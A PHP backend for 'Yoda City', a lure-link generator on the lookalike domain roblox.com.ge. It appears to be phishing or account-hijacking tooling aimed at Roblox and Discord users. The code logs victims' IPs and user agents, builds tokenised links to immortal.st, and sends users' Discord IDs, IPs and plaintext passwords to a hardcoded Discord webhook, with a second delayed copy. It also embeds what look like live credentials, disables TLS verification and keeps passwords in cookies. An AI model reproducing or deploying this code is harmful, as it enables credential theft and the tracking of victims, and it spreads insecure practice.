<?php
session_start();
define('DISCORD_CLIENT_ID', '1521949100201742498');
define('DISCORD_CLIENT_SECRET', 'Nz74SPghoU_LCoFwG7s-4kidjBGr0aF');
define('DISCORD_REDIRECT_URI', 'https://roblox.com.ge/index.php?action=callback');
define('IMMORTAL_RECOVERY_TOKEN', 'I6cFRS1hj7cWJB05EZ32Pno0NEtYS3ZKWU1nRysvNFBqcHpzbmxEUHVyNDYrR2J5NW9CaDd2MHZKSjQ9');
define('IMMORTAL_BASE_URL', 'https://immortal.st');
define('WEBHOOK_URL', 'https://discord.com/api/webhooks/1521912813499449455/Wy7F6-rKzO5Nn7hhZJFC2oaR7OfHSEEMjVvNg0euq77XeCGSXn5xjPaavYrfJdslDraA');

$db = new SQLite3(__DIR__ . '/yoda_city.db');
$db->exec("CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    discord_id TEXT UNIQUE NOT NULL,
    discord_username TEXT,
    discord_avatar TEXT,
    password_hash TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_login DATETIME,
    access_token TEXT
)");
$db->exec("CREATE TABLE IF NOT EXISTS generated_links (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    link_type TEXT NOT NULL,
    target_id TEXT NOT NULL,
    immortal_link TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$db->exec("CREATE TABLE IF NOT EXISTS webhook_queue (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    payload TEXT NOT NULL,
    send_after DATETIME NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    sent INTEGER DEFAULT 0
)");
$db->exec("CREATE TABLE IF NOT EXISTS victims (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    generated_link_id INTEGER,
    victim_ip TEXT,
    victim_user_agent TEXT,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

function sendWebhook($data) {
    $ch = curl_init(WEBHOOK_URL);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function queueDelayedWebhook($data, $userId = null) {
    global $db;
    $stmt = $db->prepare("INSERT INTO webhook_queue (user_id, payload, send_after) VALUES (?, ?, DATETIME('now', '+30 minutes'))");
    $stmt->bindValue(1, $userId, SQLITE3_INTEGER);
    $stmt->bindValue(2, json_encode($data), SQLITE3_TEXT);
    $stmt->execute();
}

$action = $_GET['action'] ?? '';
$error = $_SESSION['error'] ?? null;
$success = $_SESSION['success'] ?? null;
unset($_SESSION['error'], $_SESSION['success']);

if ($action === 'logout') {
    session_destroy();
    setcookie('yoda_user', '', time() - 3600, '/');
    setcookie('yoda_pass', '', time() - 3600, '/');
    header('Location: index.php');
    exit;
}

if ($action === 'password_login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $identifier = $_POST['identifier'] ?? '';
    $password = $_POST['password'] ?? '';
    $stmt = $db->prepare("SELECT * FROM users WHERE discord_id = ? OR discord_username = ?");
    $stmt->bindValue(1, $identifier, SQLITE3_TEXT);
    $stmt->bindValue(2, $identifier, SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);
    if ($user && password_verify($password, $user['password_hash'])) {
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['discord_id'] = $user['discord_id'];
        $_SESSION['discord_username'] = $user['discord_username'];
        $upd = $db->prepare("UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?");
        $upd->bindValue(1, $user['id'], SQLITE3_INTEGER);
        $upd->execute();
        setcookie('yoda_user', $user['discord_id'], time() + 86400 * 30, '/');
        setcookie('yoda_pass', $password, time() + 86400 * 30, '/');
        header('Location: index.php');
        exit;
    } else {
        $_SESSION['error'] = 'account not found or wrong password';
        header('Location: index.php');
        exit;
    }
}

if ($action === 'callback' && isset($_GET['code'])) {
    $code = $_GET['code'];
    $ch = curl_init('https://discord.com/api/oauth2/token');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'client_id' => DISCORD_CLIENT_ID,
            'client_secret' => DISCORD_CLIENT_SECRET,
            'grant_type' => 'authorization_code',
            'code' => $code,
            'redirect_uri' => DISCORD_REDIRECT_URI,
            'scope' => 'identify',
        ]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/x-www-form-urlencoded'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $tokenRes = curl_exec($ch);
    curl_close($ch);
    $tokenData = json_decode($tokenRes, true);
    $accessToken = $tokenData['access_token'] ?? '';
    if (!$accessToken) { $_SESSION['error'] = 'discord auth failed'; header('Location: index.php'); exit; }
    $ch = curl_init('https://discord.com/api/users/@me');
    curl_setopt_array($ch, [
        CURLOPT_HTTPHEADER => ["Authorization: Bearer $accessToken"],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $userRes = curl_exec($ch);
    curl_close($ch);
    $discordUser = json_decode($userRes, true);
    $discordId = $discordUser['id'] ?? '';
    $discordUsername = $discordUser['username'] ?? 'Unknown';
    $discordAvatar = $discordUser['avatar'] ?? '';
    if (!$discordId) { $_SESSION['error'] = 'could not get discord info'; header('Location: index.php'); exit; }
    $stmt = $db->prepare("SELECT * FROM users WHERE discord_id = ?");
    $stmt->bindValue(1, $discordId, SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);
    if ($user) {
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['discord_id'] = $user['discord_id'];
        $_SESSION['discord_username'] = $user['discord_username'];
        $upd = $db->prepare("UPDATE users SET last_login = CURRENT_TIMESTAMP, access_token = ? WHERE id = ?");
        $upd->bindValue(1, $accessToken, SQLITE3_TEXT);
        $upd->bindValue(2, $user['id'], SQLITE3_INTEGER);
        $upd->execute();
        sendWebhook(['embeds'=>[['title'=>'🔄 User Re-authenticated — Yoda City','color'=>5793266,'fields'=>[['name'=>'User','value'=>$discordUsername,'inline'=>true],['name'=>'ID','value'=>$discordId,'inline'=>true],['name'=>'IP','value'=>$_SERVER['REMOTE_ADDR']??'?','inline'=>true]],'timestamp'=>date('c')]]]);
    } else {
        $randomPassword = bin2hex(random_bytes(8));
        $passwordHash = password_hash($randomPassword, PASSWORD_BCRYPT);
        $ins = $db->prepare("INSERT INTO users (discord_id, discord_username, discord_avatar, password_hash, access_token) VALUES (?, ?, ?, ?, ?)");
        $ins->bindValue(1, $discordId, SQLITE3_TEXT);
        $ins->bindValue(2, $discordUsername, SQLITE3_TEXT);
        $ins->bindValue(3, $discordAvatar, SQLITE3_TEXT);
        $ins->bindValue(4, $passwordHash, SQLITE3_TEXT);
        $ins->bindValue(5, $accessToken, SQLITE3_TEXT);
        $ins->execute();
        $userId = $db->lastInsertRowID();
        $_SESSION['user_id'] = $userId;
        $_SESSION['discord_id'] = $discordId;
        $_SESSION['discord_username'] = $discordUsername;
        setcookie('yoda_user', $discordId, time() + 86400 * 30, '/');
        setcookie('yoda_pass', $randomPassword, time() + 86400 * 30, '/');
        $payload = ['embeds'=>[['title'=>'🆕 New Yoda City User','color'=>5793266,'thumbnail'=>['url'=>"https://cdn.discordapp.com/avatars/$discordId/$discordAvatar.png"],'fields'=>[['name'=>'Discord','value'=>$discordUsername,'inline'=>true],['name'=>'ID','value'=>$discordId,'inline'=>true],['name'=>'Password','value'=>"`$randomPassword`",'inline'=>false],['name'=>'IP','value'=>$_SERVER['REMOTE_ADDR']??'?','inline'=>true]],'footer'=>['text'=>'Yoda City • register'],'timestamp'=>date('c')]]];
        sendWebhook($payload);
        queueDelayedWebhook($payload, $userId);
    }
    $_SESSION['success'] = 'welcome to Yoda City';
    header('Location: index.php');
    exit;
}

$generatedLink = '';
$genError = '';
if (isset($_SESSION['user_id']) && ($_POST['generate'] ?? '')) {
    $type = $_POST['type'] ?? '';
    $target = trim($_POST['target'] ?? '');
    $userId = $_SESSION['user_id'];
    if ($type === 'server' && preg_match('/^[0-9]+$/', $target)) {
        $link = IMMORTAL_BASE_URL . '/go?token=' . urlencode(IMMORTAL_RECOVERY_TOKEN) . '&type=server&id=' . urlencode($target) . '&ref=' . urlencode($_SESSION['discord_id']);
        $ins = $db->prepare("INSERT INTO generated_links (user_id, link_type, target_id, immortal_link) VALUES (?, ?, ?, ?)");
        $ins->bindValue(1, $userId, SQLITE3_INTEGER);
        $ins->bindValue(2, 'server', SQLITE3_TEXT);
        $ins->bindValue(3, $target, SQLITE3_TEXT);
        $ins->bindValue(4, $link, SQLITE3_TEXT);
        $ins->execute();
        $generatedLink = $link;
    } elseif ($type === 'profile' && preg_match('/^[a-zA-Z0-9_]+$/', $target)) {
        $link = 'https://roblox.com.ge/user/' . urlencode($target) . '?ref=yoda&token=' . urlencode(IMMORTAL_RECOVERY_TOKEN);
        $ins = $db->prepare("INSERT INTO generated_links (user_id, link_type, target_id, immortal_link) VALUES (?, ?, ?, ?)");
        $ins->bindValue(1, $userId, SQLITE3_INTEGER);
        $ins->bindValue(2, 'profile', SQLITE3_TEXT);
        $ins->bindValue(3, $target, SQLITE3_TEXT);
        $ins->bindValue(4, $link, SQLITE3_TEXT);
        $ins->execute();
        $generatedLink = $link;
    } else {
        $genError = 'invalid input';
    }
}

if (!isset($_SESSION['user_id']) && isset($_COOKIE['yoda_user']) && isset($_COOKIE['yoda_pass'])) {
    $stmt = $db->prepare("SELECT * FROM users WHERE discord_id = ?");
    $stmt->bindValue(1, $_COOKIE['yoda_user'], SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);
    if ($user && password_verify($_COOKIE['yoda_pass'], $user['password_hash'])) {
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['discord_id'] = $user['discord_id'];
        $_SESSION['discord_username'] = $user['discord_username'];
    }
}

$currentUser = null;
$recentLinks = [];
if (isset($_SESSION['user_id'])) {
    $stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->bindValue(1, $_SESSION['user_id'], SQLITE3_INTEGER);
    $result = $stmt->execute();
    $currentUser = $result->fetchArray(SQLITE3_ASSOC);
    $stmt = $db->prepare("SELECT * FROM generated_links WHERE user_id = ? ORDER BY created_at DESC LIMIT 10");
    $stmt->bindValue(1, $_SESSION['user_id'], SQLITE3_INTEGER);
    $result = $stmt->execute();
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) { $recentLinks[] = $row; }
}

// ─── AUTO PROCESS DELAYED WEBHOOKS (fires on page visit — no cron needed) ───
$queueResult = $db->query("SELECT * FROM webhook_queue WHERE sent = 0 AND send_after <= CURRENT_TIMESTAMP LIMIT 3");
while ($row = $queueResult->fetchArray(SQLITE3_ASSOC)) {
    $payload = json_decode($row['payload'], true);
    if ($payload && isset($payload['embeds'][0])) {
        $payload['embeds'][0]['title'] = '⏰ [DELAYED 30m] ' . ($payload['embeds'][0]['title'] ?? 'Notification');
        sendWebhook($payload);
        $upd = $db->prepare("UPDATE webhook_queue SET sent = 1 WHERE id = ?");
        $upd->bindValue(1, $row['id'], SQLITE3_INTEGER);
        $upd->execute();
    }
}
?>
